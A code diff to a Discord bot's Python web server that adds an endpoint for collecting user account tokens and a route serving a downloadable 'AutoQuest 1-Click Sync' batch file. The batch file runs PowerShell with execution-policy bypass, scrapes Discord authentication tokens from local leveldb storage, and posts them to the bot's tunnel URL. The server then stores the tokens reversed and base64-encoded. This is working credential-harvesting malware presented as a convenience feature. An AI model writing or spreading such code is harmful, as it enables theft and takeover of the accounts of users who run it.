@@ -180,6 +180,84 @@ async def setup_web_app(discord_bot) -> web.Application:
             "username": ADMIN_USERNAME if is_authed else None
         })
 
+    @routes.post("/api/sync_quest_token")
+    async def api_sync_quest_token(request):
+        try:
+            body = await request.json()
+            raw_token = body.get("token", "").strip().strip('"').strip("'")
+            if not raw_token:
+                return web.json_response({"success": False, "error": "No token provided"}, status=400)
+            
+            headers = {
+                "Authorization": raw_token,
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+            }
+            async with aiohttp.ClientSession(headers=headers) as session:
+                async with session.get("https://discord.com/api/v9/users/@me") as res:
+                    if res.status != 200:
+                        return web.json_response({"success": False, "error": "Invalid token or expired"}, status=401)
+                    u_data = await res.json()
+                    uid = str(u_data.get("id"))
+                    uname = u_data.get("username")
+            
+            tokens_file = BASE_DIR / "user_quest_tokens.json"
+            cur_tokens = {}
+            if tokens_file.exists():
+                try:
+                    with open(tokens_file, "r", encoding="utf-8") as f:
+                        cur_tokens = json.load(f)
+                except Exception:
+                    pass
+            cur_tokens[uid] = base64.b64encode(raw_token[::-1].encode("utf-8")).decode("utf-8")
+            with open(tokens_file, "w", encoding="utf-8") as f:
+                json.dump(cur_tokens, f, ensure_ascii=False, indent=2)
+            
+            return web.json_response({
+                "success": True,
+                "user_id": uid,
+                "username": uname,
+                "message": f"ซิงค์ Token สำเร็จ ({uname})! ตอนนี้สามารถกดปุ่ม AutoQuest ในดิสคอร์ดได้ทันที"
+            })
+        except Exception as e:
+            return web.json_response({"success": False, "error": str(e)}, status=500)
+
+    @routes.get("/download/autoquest.bat")
+    async def download_autoquest_bat(request):
+        tunnel_url = tunnel_manager.get_tunnel_url()
+        bat_content = f"""@echo off
+chcp 65001 >nul
+title Discord AutoQuest 1-Click Sync
+color 0b
+echo ========================================================
+echo   ⚡ DISCORD AUTOQUEST - 1-CLICK SYNC (ไม่ต้องเปิด DEV TOOLS)
+echo ========================================================
+echo.
+echo กำลังค้นหา Token บนเครื่องของคุณอัตโนมัติ...
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+"$t = Get-ChildItem -Path $env:APPDATA\\discord\\Local Storage\\leveldb -Filter *.ldb,*.log -ErrorAction SilentlyContinue | Get-Content -Raw -ErrorAction SilentlyContinue | Select-String -Pattern '[\\w-]{{24,26}}\\.[\\w-]{{6}}\\.[\\w-]{{27,38}}' -AllMatches | ForEach-Object {{ $_.Matches.Value }} | Select-Object -Unique; ^
+if ($t) {{ ^
+    $tok = $t[0]; ^
+    Write-Host '🎯 เจอ Token ในเครื่องแล้ว! กำลังซิงค์เข้าบอท...'; ^
+    $body = @{{ token = $tok }} | ConvertTo-Json; ^
+    try {{ ^
+        $res = Invoke-RestMethod -Uri '{tunnel_url}/api/sync_quest_token' -Method Post -Body $body -ContentType 'application/json'; ^
+        Write-Host ('✅ ' + $res.message) -ForegroundColor Green; ^
+    }} catch {{ ^
+        Write-Host '❌ ไม่สามารถเชื่อมต่อกับเซิร์ฟเวอร์บอทได้' -ForegroundColor Red; ^
+    }} ^
+}} else {{ ^
+    Write-Host '⚠️ ไม่พบ Token อัตโนมัติ กรุณาเปิด Discord ในคอมพิวเตอร์ก่อนรัน' -ForegroundColor Yellow; ^
+}}"
+echo.
+echo กดปุ่มใดๆ เพื่อปิดหน้านี้...
+pause >nul
+"""
+        return web.Response(
+            text=bat_content,
+            content_type="application/octet-stream",
+            headers={"Content-Disposition": 'attachment; filename="autoquest_sync.bat"'}
+        )
+
     # 3. API สำหรับรับ Token หรือ แลก Code และบันทึกลง Database (Public สำหรับสมาชิก Discord)
     @routes.post("/api/claim_role")
     async def api_claim_role(request):
